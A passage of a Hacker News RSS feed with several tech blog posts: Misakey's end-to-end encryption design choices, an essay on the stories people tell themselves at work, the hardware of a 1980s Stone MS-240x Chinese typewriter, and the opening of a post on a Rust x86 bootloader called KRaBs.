&gt;&gt;&gt; <span>(</span>.read_to_string f<span>)</span>
</pre>
</div>
</div></div>]]>
            </description>
            <link>https://dpbriggs.ca/blog/Implementing-Method-Calls-In-x7</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514658</guid>
            <pubDate>Fri, 18 Sep 2020 09:19:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Year and a Half of End-to-End Encryption at Misakey]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514370">thread link</a>) | @cedricvanrompay
<br/>
September 18, 2020 | https://about.misakey.com/cryptography/white-paper.html?pk_campaign=HackerNews_Cedric | <a href="https://web.archive.org/web/*/https://about.misakey.com/cryptography/white-paper.html?pk_campaign=HackerNews_Cedric">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
    <article>
      

<p>A journey through some of the reasonings and technical challenges that I had so far as a software developer at Misakey specialized in cryptography and security.</p>

<h2 id="how-i-got-here">How I Got Here</h2>
<p>I was recruited by Misakey shortly after its first fundraising (February 2019, ‚Ç¨1M). The mission of Misakey was, and still is as of today, to provide an easy-to-use and highly secure way to connect people to the numerous accounts they have on other websites, as well as to connect people between each other. One key element of the solution was to encrypt user data in an <em>end-to-end</em> fashion, meaning that, while the data exchanged by users and websites would flow through our servers, it would be encrypted with a key that Misakey does not have. Doing so greatly increases the security of user‚Äôs data, but it adds a lot of technical challenges.</p>
<p><em>‚ÄúDo not roll your own crypto‚Äù</em>: this adage is a reminder to software developers that cryptography is a very tricky discipline. Trying to build your own cryptography without a high degree of knowledge in this field is a sure way to introduce a security vulnerability in your product. Instead, you should rely entirely on third-party tools and services when it comes to cryptography, and you should avoid using them in a ‚Äúcreative‚Äù way.</p>
<p>At Misakey, we try to follow this principle as much as possible. For instance, we do TLS<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> in the most standard, boring, uncreative way. But end-to-end encryption is still quite a ‚Äúbleeding-edge‚Äù technology, and as a result you are not sure to find a tool that perfectly fits your needs. In this situation, there are two sane things to do: giving up, or investing massively in cryptographic expertise.</p>
<p>The founders of Misakey went for the second option. Unfortunately, professional software developers with a high expertise in cryptography are pretty rare. So they went for the opposite approach: they started looking for an expert in cryptography that would have decent skills in software development.</p>
<p>At that time, I had recently finished my PhD on cryptography and secure protocols after graduating as an engineer from <a href="https://www.telecom-paris.fr/">T√©l√©com Paris</a> and <a href="https://www.eurecom.fr/fr">EURECOM</a>. Although I had never worked as a professional software developer, I had been programming as a hobbyist since the age of 15, and the engineering schools I graduated from are quite specialized in I.T. After a few discussions on the phone with the founders, I was hired. The deal was that I would progressively become a professional software developer in his own right by programming with the rest of the team, while using my knowledge of cryptography to design and implement the protocols Misakey needs. I also had some training in general cyber security (‚Äúhacking‚Äù, sort of), so I would be quite active on this topic as well<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>.</p>
<h2 id="end-to-end-encryption">End-to-End Encryption</h2>
<p>End-to-end encryption is really booming these years. This is sometimes taking the form of what is called ‚Äúclient-side encryption‚Äù in some cloud-based services, like <a href="https://blog.cozy.io/en/cozy-cloud-how-to-encrypt-web-application/">what Cozy Cloud is doing</a> for instance, but the biggest trend is ‚Äúencrypted chat applications‚Äù. <a href="https://signal.org/blog/whatsapp-complete/">WhatsApp conversations use end-to-end encryption by default since 2016</a>, and <a href="https://signal.org/blog/facebook-messenger/">Facebook Messenger offers end-to-end encrypted conversations since more or less the same time</a>. <a href="https://telegram.org/">Telegram</a> is another popular chat application that offers end-to-end encryption, and there are a few other applications having a smaller market share, like <a href="https://signal.org/">Signal</a> and <a href="https://element.io/">Element</a> (formerly known as ‚ÄúRiot‚Äù).</p>
<figure>
    <img src="https://about.misakey.com/cryptography/images/e2e.png"> 
</figure>

<p>Before the rise of end-to-end encryption, messages were already encrypted in chat applications, but only with the TLS protocol<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup> that provides encryption from a device (a computer or a phone) to a server. In TLS, the device and the server negotiate an encryption key with each other so that they communicate securely, but because this key is known to the server, the server ‚Äúsees‚Äú the data. Most of the time this is perfectly fine because the data is actually intended for the server. For instance when you change your username in Misakey, the new user name is only encrypted with TLS. For most websites, TLS is (almost) all the cryptography that‚Äôs required to operate the service securely, and nowadays it‚Äôs quite simple for anyone to enable TLS on her website in a secure way thanks to <a href="https://letsencrypt.org/">Let‚Äôs Encrypt</a> and <a href="https://certbot.eff.org/">CertBot</a>.</p>
<p>The situation is different in chat applications and in services like Misakey that simply act as intermediaries between users: the server is not one of the ‚Äúends‚Äù of the conversation anymore, it simply forwards data between users having a conversation. As a result, you cannot claim to provide ‚Äúend-to-end encryption‚Äù simply because you are using TLS.</p>
<p>It doesn‚Äôt mean that a chat application using only TLS is ‚Äúless secure‚Äù than a usual website. It means that we could aim at a higher level of security: if the server doesn‚Äôt <em>need</em> to see the data, we have an opportunity to protect the data from a hack of the server, and we do this by making the server <em>unable</em> to read the data.</p>
<p>It is tempting to ask: why not just use TLS from device to device, then? One reason is that TLS simply does not work from device to device: in TLS, servers do most of the work, so it is not trivial to recreate the same protocol with just devices. A second reason is that TLS will not give us some properties that we want for Misakey, like conversations between more than two devices and/or users. Of course, we will regularly see how things are done in the TLS protocol to better understand how to build our end-to-end encryption protocol, but it cannot be as simple as <em>‚Äúusing TLS from device to device‚Äù</em>.</p>
<h2 id="existing-protocols-and-why-we-are-not-using-them">Existing Protocols and Why We Are Not Using Them</h2>
<p>The end-to-end encryption protocol used by WhatsApp, Facebook Messenger and Signal is the ‚ÄúSignal Protocol‚Äù (because it was first developed by Signal, who then helped WhatsApp and Facebook integrate it in their own app) whose <a href="https://signal.org/docs/">specification and implementation are free open-source software</a>. This means that in theory we could use it to build Misakey, but in practice the Signal protocol is not really meant to be used as a stable platform for building other end-to-end encrypted products.</p>
<p>Element is a bit different from the other encrypted chat applications. The main goal of the people behind Element is to promote an entire <em>messaging protocol</em>, called <a href="https://matrix.org/">the <em>Matrix Protocol</em></a>, whose original purpose was to <em>‚Äúreplace email‚Äù</em>. Element is simply a client for this protocol, but the developers want <a href="https://matrix.org/clients-matrix/">anyone to be able to implement their own client</a>, just like there are various programs to surf the Web or manage emails.</p>
<p>As a result, the Matrix protocol and the various parts of the Element application are designed to be usable as building blocks for other implementations and usage. In particular, <a href="https://github.com/matrix-org/matrix-js-sdk">the Matrix JS SDK</a> gives you a high-level interface to use the Matrix Protocol, including the end-to-end encryption part, without having to worry too much about the technical details of it: you enable end-to-end encryption in a chat room by calling <code>matrixClient.setRoomEncryption</code> with the ID of the chat room, and now all the messages sent to this room will be end-to-end encrypted, even if there are many people in it, each one using several devices. The Matrix team also provides a server for the Matrix Protocol, <a href="https://github.com/matrix-org/synapse">Synapse</a>, which is very easy to use.</p>
<p>At the beginning of Misakey, the idea was to use the Matrix protocol as a communication platform to build our product. This way we did not have to implement end-to-end encryption ourselves, and we could enjoy a mature protocol and implementation which we would not have to maintain ourselves.</p>
<p>The Matrix protocol, and <a href="https://gitlab.matrix.org/matrix-org/olm">its end-to-end encryption protocol named ‚Äúolm‚Äù</a>, are quite easy to use and to integrate in your own application ‚Ä¶ as long as the application you are trying to build is close enough to Element. Now Misakey is not exactly a ‚Äúchat‚Äù application, its goal is mainly directed towards automated management of people‚Äôs accounts and data. As a result, we had some feature requirements that were quite far from what Matrix was designed for, like sending data to people that don‚Äôt have an account yet, or seamless device-to-device synchronization. Implementing them with Matrix would have required to somehow ‚Äúbend‚Äù the protocol, using it in ways it was not designed for, and this seemed overly complicated.</p>
<p>There were also a few features we were missing from the Matrix JS SDK, mainly regarding key management in the olm protocol. We had no idea if we could push for their integration, and it seemed too much of a hassle to implement them in our own fork of Matrix. At some time <a href="https://github.com/matrix-org/matrix-js-sdk/pull/1167">we tried to contribute to the Matrix JS SDK</a>, but again this did not give us the speed we needed.</p>
<p>Maybe one day the Matrix protocol will become more versatile and we will be able to use it as a base for Misakey, but for now it seems faster to implement our own protocol, and to use Matrix as a source of inspiration. This lets us move faster, even if it is a great responsibility to implement end-to-end encryption from scratch. As we said, end-to-end encryption is a technology that is still quite ‚Äúyoung‚Äù.</p>
<h2 id="the-most-trivial-end-to-end-encryption-protocol">The Most Trivial End-to-End Encryption Protocol</h2>
<p>It‚Äôs time to start building things. The quickest way of deploying end-to-end encryption between two users is to do the following: first, make the application of one user generate an encryption key. Then, tell this user to send the key to the other user through some other communication channel, typically email or some other chat application,or in person. This ‚Äúother communication channel‚Äù must be secure enough. When the application of the other user receives the key, the applications of both users can use this key to encrypt data for each other.</p>
<figure>
    <img src="https://about.misakey.com/cryptography/images/basic-e2e.png" alt="chart illustrating basic end-to-end encryption with the key sent through an out-of-band channel"> 
</figure>

<p>Note that the key must <em>not</em> be sent through Misakey itself, otherwise it is not ‚Äúend-to-end encryption‚Äù any more. This is why I speak of <em>another</em> communication channel. This is called an <em>out-of-band channel</em> in end-to-end encryption.</p>
<p>Of course it is not ideal to have to assume that users <em>already</em> have this out-of-band channel to send cryptographic keys to each other in a secure manner. One could ‚Ä¶</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://about.misakey.com/cryptography/white-paper.html?pk_campaign=HackerNews_Cedric">https://about.misakey.com/cryptography/white-paper.html?pk_campaign=HackerNews_Cedric</a></em></p>]]>
            </description>
            <link>https://about.misakey.com/cryptography/white-paper.html?pk_campaign=HackerNews_Cedric</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514370</guid>
            <pubDate>Fri, 18 Sep 2020 08:35:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The stories we tell ourselves can make or break who we are]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514358">thread link</a>) | @ochronus
<br/>
September 18, 2020 | https://ochronus.online/stories-we-tell-ourselves/ | <a href="https://web.archive.org/web/*/https://ochronus.online/stories-we-tell-ourselves/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
<div>
<article>

<figure>
<img srcset="https://ochronus.online/content/images/size/w300/2020/09/the-stories-we-tell-ourselves.jpg 300w,
                            https://ochronus.online/content/images/size/w600/2020/09/the-stories-we-tell-ourselves.jpg 600w,
                            https://ochronus.online/content/images/size/w1000/2020/09/the-stories-we-tell-ourselves.jpg 1000w,
                            https://ochronus.online/content/images/size/w2000/2020/09/the-stories-we-tell-ourselves.jpg 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://ochronus.online/content/images/size/w2000/2020/09/the-stories-we-tell-ourselves.jpg" alt="The stories we tell ourselves">
</figure>
<section>
<div>
<blockquote>‚ÄúWe tell ourselves stories in order to live‚Ä¶We look for the sermon in the suicide, for the social or moral lesson in the murder of five. We interpret what we see, select the most workable of the multiple choices. We live entirely, especially if we are writers, by the imposition of a narrative line upon disparate images, by the ‚Äúideas‚Äù with which we have learned to freeze the shifting phantasmagoria which is our actual experience.‚Äù ‚Äì <em><strong>Joan Didion</strong>, The White Album</em></blockquote><p>A good story can entertain, motivate, teach valuable lessons, and solidify good habits.</p><p>A bad story can demotivate, cause frustration and anger, and curb our capability to be fully ourselves.</p><p>These stories are not necessarily false but usually, they don‚Äôt tell the entire truth ‚Äî just one perspective. Another person could look at the same situation and tell a very different story. Telling ourselves stories is natural ‚Äî we all do it, all the time. There‚Äôs nothing inherently wrong with it. That said <strong><em>if we aren‚Äôt aware of this happening, we won‚Äôt understand how they shape our mood, actions, happiness, and relationships.</em></strong></p><h3 id="an-example-of-such-a-story-">An example of such a story:</h3><p><strong>The event:</strong> You submitted a pull request for review after half a day of work. Another engineer asked you to change half of your code and to increase your test coverage.</p><blockquote><strong><em>Your story:</em></strong> A nitpicking a**hole commented on every single thing I did in that pull request; I guess he has nothing better to do. I wish people stopped blocking me from making progress. Why are they always making game of me?!</blockquote><blockquote><strong><em>The other engineer‚Äôs story:</em></strong> Some terrible code almost went live today; thank god I checked that pull request! Why does it always have to be me to watch quality? It‚Äôs so sad it‚Äôs only important to me in this whole company‚Ä¶</blockquote><blockquote><strong><em>A bystander‚Äôs story:</em></strong> Whoa, that was some tense back-and-forth in the comments of that pull request. I wish people were just nicer to each other; we all want to do a good job at the end of the day, right?</blockquote><h2 id="roots-of-these-stories">Roots of these stories</h2><p>The most common origins of these stories are cognitive biases, our self-image made by / combined with our limiting beliefs, and our fears.</p><h3 id="our-self-image-and-limiting-beliefs">Our self-image and limiting beliefs</h3><p>Ultimately we all have an idea about what kind of a person we are. This idea subconsciously influences how we think, react, and make decisions. The image is usually closely tied to our fundamental values and worldview. Most of us want to be <em>good persons</em> in the end. What ‚Äòright‚Äô is is defined by these very values and core beliefs. Our self-image influences the stories we tell ourselves because we‚Äôre looking for ways to find justification in our day-to-day experience.</p><p>Thus this image can limit our perceived set of options and understanding of the world around us.</p><p>Related to the personas in the previous example:</p><ul><li>I‚Äôm the guy who gets things done (<em>might imply that I think others are slowpokes</em>)</li><li>As a professional software engineer I am the sole guardian of quality in the company (<em>might imply that I think others are careless or unprofessional</em>)</li><li>I‚Äôm the kind of person who cares for others' feelings (<em>might imply that I think others have lower EQ</em>)</li></ul><p>Of course these are simply bits and pieces of the whole image.</p><p>In all of the narratives above there are (hopefully unfounded) assumptions, lots of jumping to conclusions and unproductive, limiting language. In this particular situation, this locks the actors in the status quo, lowering the hope for change. It feels like a stalemate unless someone is willing to be more open.</p><p>By the way I‚Äôve written a bit about this earlier in the post titled <a href="https://ochronus.online/this-is-how-i-am/"><em>This is how I am</em></a></p><h3 id="our-fears">Our fears</h3><p>Fear also changes the kind of stories you tell yourself. Living in fear means giving up agency, seeing yourself as a passive spectator or a victim. It means seeing yourself as being controlled by circumstances, the actions of others, or your own emotions. And once the story you tell yourself becomes the story of a victim, you will be more and more likely to think and behave like a victim.</p><h3 id="cognitive-biases">Cognitive biases</h3><p>A cognitive bias is a systematic pattern of deviation from norm or rationality in judgment. They are basically ‚Äòshortcuts‚Äô our brains take so it can increase our mental efficiency by enabling us to make quick decisions without any conscious deliberation. Cognitive biases impact us in many areas of life, including social situations, memory recall, what we believe, and our behavior.</p><p>Some relevant and common cognitive biases from the staggering list of more than 180:</p><h4 id="self-serving-bias">Self-serving bias</h4><p>Self-serving bias is our tendency to blame external forces when bad things happen and give ourselves credit when good things happen. Although it can mean evading personal responsibility for your actions, self-serving bias is a defense mechanism that protects your self-esteem. In the example above, this means that if your pull request gets thumbs up from everyone, you attribute that to you being a fantastic engineer. On the other hand, if you get three comments asking you to change things, you might see others as nitpickers or your environment to be non-supportive instead of realizing you might have some room for improvement.</p><h4 id="confirmation-bias">Confirmation bias</h4><p>Confirmation bias, also known as confirmatory bias or the ‚Äúmyside bias,‚Äù is people‚Äôs tendency to seek out information that supports something they already believe. This type of bias affects our critical thinking, causing people to remember the hits and forget the misses ‚Äî a flaw in human reasoning. People will often cue into things that matter to them (the things that support their own beliefs) and dismiss those that don‚Äôt. Think about the other engineer overly obsessed with test coverage.</p><p>The tendency to attribute greater weight and accuracy to an authority figure‚Äôs opinion is at play here. Authority bias is the tendency to blindly follow or believe the instructions and views of a person in authority. We have a deeply rooted sense of duty to obey authority. How do you react when you get a comment on your pull request from a senior engineer you respect? How about if you get the same comment from a junior who just recently started at the company?</p><h2 id="so-what-can-we-do-about-it">So what can we do about it?</h2><p>Don‚Äôt forget that <em>we are the storytellers</em> - we have full control over the stories we make up. Everything starts with <strong>awareness</strong>. Stories are part of the software of our brains. They influence how we act, what‚Äôs important, and what to do when something goes wrong. But every software program has bugs. Awareness is your first step towards debugging.</p><p>Stop from time to time and think about the possibility that the story you‚Äôve just created is nothing more than a story. Consider alternative stories. Try telling the same story from other characters' side, think about what their narrative would look like.</p><p>Next time you find yourself in an upsetting situation, consider changing your story. Try this exercise: Recognize and acknowledge any feelings of fear. Hint: you may need to look underneath your anger! Ask yourself, what is it about this situation that is so upsetting? What do you believe to be ‚Äútrue‚Äù about it that feels threatening to you? As pretty much anything else, fear can be tackled one step at a time. There are ways to re-learn to say what you mean and to do what you feel is right. The good news here is that self-reinforcement works both ways. Once you‚Äôve practiced a bit and proven to yourself that it works (and that it‚Äôs less complicated than you thought), it gets easier to continue doing it.</p><p>We also must <strong>allow ourselves to be wrong.</strong> If we want to get closer to objective truths, we have to be able and ready to admit we were wrong, especially in the face of new data. If we can‚Äôt admit defeat, it makes us less capable of making discoveries in this world. We can avoid biases by being aware of our belief systems, whether our belief is for a religion, a political ideology, a cultural worldview, etc.. Let‚Äôs be open to disconfirmation, and allow ourselves to be wrong.</p><p>Self-compassion is an instrumental skill for reducing defensiveness and increasing your self-improvement motivation. It involves being kind and forgiving towards yourself, understanding that you are human and that other humans experience the same sort of experiences and failure and being able to identify uncomfortable thoughts without judging them.</p><blockquote>‚ÄúWho are we but the stories we tell ourselves, about ourselves, and believe?‚Äú ‚Äì <em><strong>Scott Turow</strong></em></blockquote><h2 id="some-fuel-for-further-thoughts">Some fuel for further thoughts</h2><p>How do you look like as a character in others' stories? Do you like that character? What can you do so that character goes through some positive development?</p><h2 id="in-case-you-want-to-read-more-about-the-topics-in-this-article-">In case you want to read more about the topics in this article:</h2><ul><li>I highly recommend <a href="http://www.ericberne.com/games-people-play/">‚ÄòGames People Play‚Äô by Eric Berne</a> from 1964 and it‚Äôs sequel <a href="http://www.ericberne.com/what-do-you-say-after-you-say-hello/">‚ÄòWhat Do You Say After You Say Hello?'</a> from 1970. The book didn‚Äôt age particularly well regarding some topics but the basic principle holds.</li><li>About cognitive bias: check out this beautiful <a href="https://www.visualcapitalist.com/wp-content/uploads/2017/09/cognitive-bias-infographic.html">visual map of cognitive biases</a> or if you like textual data more browse <a href="https://en.wikipedia.org/wiki/List_of_cognitive_biases">the relevant Wikipedia article</a> The book <a href="https://www.rickhanson.net/books/buddhas-brain/">‚ÄòBuddha‚Äôs Brain: The Practical Neuroscience of Happiness, Love, and Wisdom.'</a> - I know, such clickbaity title, but trust me, this book is pure gold.</li></ul><hr>
</div>
</section>
</article>
</div>
</div></div>]]>
            </description>
            <link>https://ochronus.online/stories-we-tell-ourselves/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514358</guid>
            <pubDate>Fri, 18 Sep 2020 08:34:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hardware Design of a 8088 based Chinese Typewriter made in the 1980s]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24514269">thread link</a>) | @tifan
<br/>
September 18, 2020 | https://tifan.net/blog/2020/09/17/ms240x-chinese-typewriter-2-ms-2401h-hardware-design/ | <a href="https://web.archive.org/web/*/https://tifan.net/blog/2020/09/17/ms240x-chinese-typewriter-2-ms-2401h-hardware-design/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <header id="banner">
      
    </header><!-- /#banner -->
    <!-- /#menu -->
<section id="content">
  <header>
    <h2>
      Stone MS-240x Typewriter (2): Hardware Design
    </h2> 
    
  </header>
  <!-- /.post-info -->
  <div>
    <p>In case you misseed it -- I talked about the backgrounds of the MS-240x typewriter in the <a href="https://tifan.net/blog/2020/09/09/revealing-a-forgotten-chinese-compute-history-stone-ms240x-chinese-typewritter-1-background/">previous article</a>. In this article, I'm going to discuss the hardware design of the legendary Stone MS-240x Chinese Typewriter (ÂõõÈÄö MS-240x ‰∏≠Ëã±ÊñáÊâìÂ≠óÊú∫) designed and sold in the mid-1980s.</p>
<p>Both the hardware and the BIOS was designed by ALPS Electric Co. ALPS provided a BIOS reference manual before the development began so that the developers in China could just write an emulator on the PC emulating the ALPS BIOS, and just focus on the development of the word processor.</p>
<div id="the-hardware">
<h2>The Hardware</h2>
<p><img alt="Stone MS-2401H ÂõõÈÄö MS-2401H ÊâìÂ≠óÊú∫" src="https://tifan.net/images/20200917-ms-2401h.jpg"></p><p>(<a href="https://www.lty.me/stone-ms-2401h/">Picture taken by @lty1993</a>)</p>
<p>As I mentioned in the previous article, the hardware is just a 8088 machine in its core. In the 80s, the Japanese engineer reverse engineered and implemented Japanese counterparts of almost all popular chips in the west. The ALPS motherboard is not an exception to that.</p>
<p>I bought the machine on Xianyu (Chinese eBay equivalent) and shipped it to @lty1993 in China for examination, disassembly, and ROM dumps. The machine is quite heavy -- shipping it to the west coast would probably cost 200 USD. Guess there won't be any Stone Chinese Typewriters in the US for a while!</p>
</div>
<div id="processor-nec-v20">
<h2>Processor: NEC V20</h2>
<p>Instead of using the actual 8088 processor, MS-240x series used the NEC V20 running at different clock frequencies. The original MS-2400 clocks at 4.9125 MHz, the upgraded MS-2401 runs at 8 MHz, and the later MS-2401H model runs at 10 MHz.</p>
<p>The V20 is 30% faster than the original 8088 running at the same clock speed, providing additional power for the heavy lifting work a Chinese Typewriters needs to do.</p>
</div>
<div id="memory-hard-wired-memory-map-with-page-control">
<h2>Memory: Hard-wired Memory Map with Page Control</h2>
<p>The RAM itself is not interesting at all. It's just a bunch of Japanese made SRAM connected to the address bus of the processor.</p>
<p>The BIOS is mapped at <cite>0xF8000</cite> to <cite>0xFFFF</cite>, and CPU will execute the instruction at <cite>0xFFFF0</cite> -- that's the convention for 8088. So naturally, the BIOS was hard wired at that address.</p>
<p>Remember we talked about the Chinese fonts? It's a mask ROM, and it is quite large -- larger than the address space of 8088 processor if we include high precision Chinese fonts at 24x24 dot (which is still pretty awful in today's standard). To solve this problem, all external ROMs were divided into 32KB pages. To access any page in the ROM, you would send a command to the ASIC to select the page first (bank switching) before reading memory from the hard wired memory location. Sounds like a MMU? Well, this <em>is</em> a poor man's MMU.</p>
<p>One thing worth noting is that all models have built in battery backup units. Newer models (such as MS-2401) can even operate with battery with up to 3 hours battery life -- it almost makes the typewritter a laptop with a built-in printer.</p>
<p>Here's the memory map for various models of the Chinese typewriter.</p>
<p><img alt="Memory Map for MS-2400" src="https://tifan.net/images/20200917-ms-2400-memory-map.png"></p><p>MS-2400 have the Chinese font mapped at <cite>0xA0000</cite> with 16 pages in total. It can support up to 3 Chinese IMEs (input methods, such as Pinyin, Wubi or Cangjie) -- a standard IME comes with the machine, up to 2 additional IMEs can be purchased as a EPROM chip inserted in the expansion ROM socket. As there's only 1 IME socket, regardless of how many IMEs would you purchase, you'll always get just one 64KB EPROM. The keyboards are mapped at <cite>0x90000</cite> and have up to 3 pages in total.</p>
<p>When the machine was designed, there's also an expansion socket at <cite>0xE8000</cite>. However, the expansion socket was never used.</p>
<p>As the only display device is a 240x64 LCD, the VRAM is just 2KB in size mapped at <cite>0x80000</cite>.</p>
<p><img alt="Memory Map for MS-2401" src="https://tifan.net/images/20200917-ms-2401-memory-map.png"></p><p>MS-2401 is significantly more capable with a bigger LCD display, larger RAM, and larger Chinese font ROM. To conserve mask ROM space, all font data in the mask ROM was compressed.</p>
<p><img alt="Memory Map for MS-2401H" src="https://tifan.net/images/20200917-ms-2401h-memory-map.png"></p><p>You might wonder what does "V-RAM (CRT Áî®)" in MS-2401H/01C mean. MS-2401H/01C is the top of the line model in MS-2401 series featuring ability to attach an external monitor. The graphics chip is <cite>MGP TM6066A</cite>, a Hercules clone, with MDA output.</p>
</div>
<div id="system-devices">
<h2>System Devices</h2>
<p>We all know the 8088 is not a very capable machine. ALPS custom made a few ASICs to connect system devices such as printers, keyboards and LCD monitors to the system. That's also what makes it extremely hard to write an emulator -- without knowing exactly how the ASIC works, it's close to impossible to emulate all devices and peripherals. Even with the original designer's help, we still can't be quite sure what is the exact IO address for each device, let alone determining what each command would do.</p>
<p>But anyway, we do have an rough idea of what the system is doing.</p>
<div id="external-storage-device">
<h3>External Storage Device</h3>
<p>The first model, MS-2400, have an audio cassette connector running at 1200bps. Each cassette can hold around 500KB of data, or 250k Chinese characters.</p>
<p>In 1986, when 3 1/2 inch disk just came out, Mr Jizhi Wang chose to use the very new technology in MS-2401. This is a killer function at that time, because digital documents could be finally archived relatively cheaply. Of course you could always use a computer, but that's a big upfront investment.</p>
</div>
<div id="keyboard">
<h3>Keyboard</h3>
<p><img alt="Memory Map for MS-2401" src="https://tifan.net/images/20200917-ms-2401-keyboard.jpg"></p><p>It's not a ANSI keyboard. The design seems to be inspired by JIS keyboard, and was fully translated into Chinese -- you can't even find "Ctrl" on the keyboard, instead, you'll see "ÊéßÂà∂" (lit. control). This flattens learning curve for the typewriter, as it doesn't feel foreign to the users. Just like we say "it's all Chinese to me" -- the Chinese users would say "it's all English to me" -- because it really is!</p>
<p>One interesting fact to point out is instead of commonly seem Esc, Tab, Caps Lock, Shift, Ctrl arrangement on the left, the keyboard is actually Âçä/ÂÖ® (half width / full width), Tab, Ctrl, Shift, Â∏∏Áî®Â≠ó (frequently used characters). Of course, it's a Chinese typewriter, Caps Lock isn't that important after all.</p>
</div>
<div id="printer">
<h3>Printer</h3>
<p>It sees that the printer only accepts low level commands -- or shall we say, the printer itself does not have a controller. According to the reference manual, the printer head and motor are directly controlled by the ASIC. It also needs a few dedicated timers.</p>
</div>
<div id="asic-and-fdd-controller">
<h3>ASIC and FDD Controller</h3>
<p>In MS-2401H, there are 2 ASICs, each of them contains around 8000 gates. the model is uPD91260GD-5BD and uPD91261GD-5BB.</p>
<p>The floppy controller for MS-2401 MS-2401H is UPD72067GC.</p>
</div>
</div>
<div id="conclusion">
<h2>Conclusion</h2>
<p>The MS series machines are classical examples of pushing the hardware to its limits. Most people would simply say it's impossible to use a 8088-equivalent to drive a Chinese typewriter, but the engineers did it. By abusing the system and designing chips around the 8088, they were even able to map memory larger than the actual address space of the machine! Hats off to the hardworking engineers both in Stone Company and ALPS Electric.</p>
<p>Another thing to point out is Stone Company wrote fabulous documentations. It's really pleasing to read, contains a lot of technical details, and in some occasions, it teaches you electrical engineering! It even contained the layout of the diagnostics program so that you can just disassemble them and add new functionalities should you need them.</p>
<p><img alt="manga illustration in technical document" src="https://tifan.net/images/20200917-stone-documentation-manga.png"></p><p>Plus, the manga illustration is pretty cute. Haven't seen them for a long long time.</p>
</div>


  </div><!-- /.entry-content -->
  

</section>
    <!-- /#contentinfo -->
    
    
  </div></div>]]>
            </description>
            <link>https://tifan.net/blog/2020/09/17/ms240x-chinese-typewriter-2-ms-2401h-hardware-design/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514269</guid>
            <pubDate>Fri, 18 Sep 2020 08:21:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing an x86 bootloader in Rust that can launch vmlinux]]>
            </title>
            <description>
<![CDATA[
Score 144 | Comments 46 (<a href="https://news.ycombinator.com/item?id=24514100">thread link</a>) | @lukastyrychtr
<br/>
September 18, 2020 | https://vmm.dev/en/rust/krabs.md | <a href="https://web.archive.org/web/*/https://vmm.dev/en/rust/krabs.md">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
<article id="contents">
<section>

<p>I've been developping an x86 bootloader in Rust that can use Linux boot protocol. In this article, I'd like to write about my motivation, features of this project, and issues. </p>
 
</section>
<section>
<h2>KRaBs - Kernel Reader and Booters</h2>
<p>KRaBs is a 4-stage chain loader for x86/x86_64 written in Rust.
<br>
 It can boot an ELF-formatted kernel placed on a FAT32 filesystem in the EFI System Partition. The ELF-formatted kernel is read from the filesystem and relocated, and then the kernel is booted. 
<br>
 It is all implemented in Rust. </p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/o8vm/krabs/">GitHub - o8vm/krabs: An x86 bootloader written in Rust.</a> </p>
<p>It has the following features: </p>
<ol> <li> Currently, only legacy BIOS is supported.</li> <li> Both 64 bit and 32 bit system are supported.</li> <li> Both 64 bit long mode and 32 bit protected mode kernel are supported.</li> <li> GPT format partition table is supported.</li> <li> FAT32 file system support.</li> <li> The boot-time behavior can be controlled by CONFIG.TXT, which is placed on the FAT32 filesystem.</li> <li> Minimal x86/x86_64 Linux boot protocol is supported.</li> <li> kernel command line setting in CONFIG.TXT is supported.</li> <li> Some modules such as initramsfs/initrd are supported.</li> 10. The multi-boot specification is not supported. </ol> 
<p>An example of starting 64bit vmlinux with kernel command line and initrd is described in <a target="_blank" rel="noopener noreferrer" href="https://github.com/o8vm/krabs/blob/master/docs/linux-image-setup-64.md">this article</a>. </p>
<p>Just git clone the project and run a <code>cargo run</code> to experience after some preparation: </p>
<pre><code>
cargo run -- -we disk.img
</code></pre>
<p><a target="_blank" rel="noopener noreferrer" href="https://vmm.dev/en/rust/gogWCnI37-demo3.gif"><img src="https://vmm.dev/en/rust/gogWCnI37-demo3.gif" alt="demo3.gif"></a></p>
</section>
<section>
<h2>What motivated me to develop KRaBs?</h2>
<p>I thought that lower level programming below the OS stack could be also made more modern by using Rust. I wanted to extract the minimum essentials from the process of booting the Linux kernel and finally make up original bootloader where there is no black box for me.
<br>
 </p>
<p>In addition: </p>
<ul> <li>It's not easy for me to read the source code of an existing chain loader.</li> <li>Reading large amounts of assembly and C source code is tough for a beginner. It takes a lot of time and effort to read it. </li> <li>It is said that Rust binaries tend to be too big and not suitable for writing bootloaders, but I wondered if it is true.</li> </ul> 
<p>Based on the above, I've decided to write down the bootloader in Rust from scratch. </p>
</section>
<section>
<h2>How KRaBs Works</h2>
</section>
<section>
<h3>Linux kernel bootstrapping mechanism</h3>
<p>While it may be difficult to unravel the Linux kernel bootstrapping mechanism from the bzImage and GRUB bootloader sources, The mechanism itself is surprisingly simple.
<br>
 There are four basic things: Loading the ELF-formatted image from the file system, Relocating it according to the program headers, and initializing system and setting parameters according to The Linux/x86 Boot Protocol. That's all there is to it. </p>
<p>Specifically, the following four types of initialization are performed: </p>
